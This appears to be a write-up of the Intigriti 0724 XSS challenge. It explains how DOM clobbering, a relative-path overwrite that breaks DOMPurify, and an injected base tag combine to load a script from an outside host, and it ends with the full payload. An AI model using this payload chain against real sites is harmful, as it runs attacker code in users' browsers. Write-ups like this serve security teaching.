+++
title = "Intigriti 0724 XSS Challenge"
date = 2024-06-06T21:00:26+05:30
draft = false
tags = ["writeups"]
+++

**tl;dr**

+ Dom clobbering to clobber isDevelopmet
+ Throwing an error using RPO to prevent Dompurify from loading
+ Using base tag's to import our evil.js
<!--more-->


## 🔎 Initial analysis

We are given a memo sharing application , and its seems like we html injection using the memo parameter. Looking at the client-side code for the application.
```html
<script integrity="sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=">
      document.getElementById("memoForm").addEventListener("submit", (event) => {
        event.preventDefault();
        const memoContent = document.getElementById("memoContentInput").value;
        window.location.href = `${window.location.href.split("?")[0]}?memo=${encodeURIComponent(
          memoContent
        )}`;
      });

      const urlParams = new URLSearchParams(window.location.search);
      const sharedMemo = urlParams.get("memo");

      if (sharedMemo) {
        const displayElement = document.getElementById("displayMemo");
        //Don't worry about XSS, the CSP will protect us for now
        displayElement.innerHTML = sharedMemo;

        if (origin === "http://localhost") isDevelopment = true;
        if (isDevelopment) {
          //Testing XSS sanitization for next release
          try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
        }
      }
    </script>
```
as you can see our input HTML goes into an innerHTML sink in the beginning itself, however there is no easy XSS as there is a CSP. 

```js

default-src *; script-src 'strict-dynamic' 'sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw=' 'sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=';
```

The csp doesnt seem too strict , the first thing that i thought of was that default src is * and there is no base uri directive in the csp .

So we can inject a base tag with our server as the href value which will make all the scripts with relative paths in the page load resources from our server.

However there is only one script being used in the page which is  dompurify.js and it is being loaded way before our injection happens so we cant make it load from our server using base tags.

However there is another script (logger.js) that is being loaded dynamically if certain conditions are satisfied. We can control the location from where logger.js is loaded using base tags as it is being loaded after our injection happens .
```js
if (origin === "http://localhost") isDevelopment = true;
        if (isDevelopment) {
          //Testing XSS sanitization for next release
          try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
        }
```
So to make logger.js load from our external server we have somehow reach the catch block. So for that to happen we need isDevelopment to be true, so that we can get inside the if block.

isDeveloment is only set to true if the origin is localhost.At the first glance it seems impossible to set isDevelopment as true.

However there are certain stuff you could to with just HTML injection!!

## 🥷 Attack plan

So the attack plan is to use DOM clobbering here as we have HTML injection to define the isDevelopment variable. As isDevelopment is a global variable a simple tag with id attribute as isDevelopment will define that variable. Eg

```js
<a id="isDevelopment">,<div id="isdevelopment"> etc 
```

## Causing an Error to reach the catch block 🌟

So now we are inside the if block , and to get to our logger.js script to load we have to get to the catch block . For that we have to cause an error somehow in these lines of code

```js
try {
    const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
    displayElement.innerHTML = sanitizedMemo;
}
```

If you look at the source code closely you can see that Dompurify is being loaded as a relative path. so if we access the page like /index.html/blah dompurify will try to get loaded from /blah .

So now that we are in the catch block we can use a base tag to load logger.js from our server.

## 🚀  Final Payloads
```html
<a id="isDevelopment">asdf</a><base href="https://alfino.free.beeceptor.com/">
```
where we host logger.js at https://alfino.free.beeceptor.com/logger.js

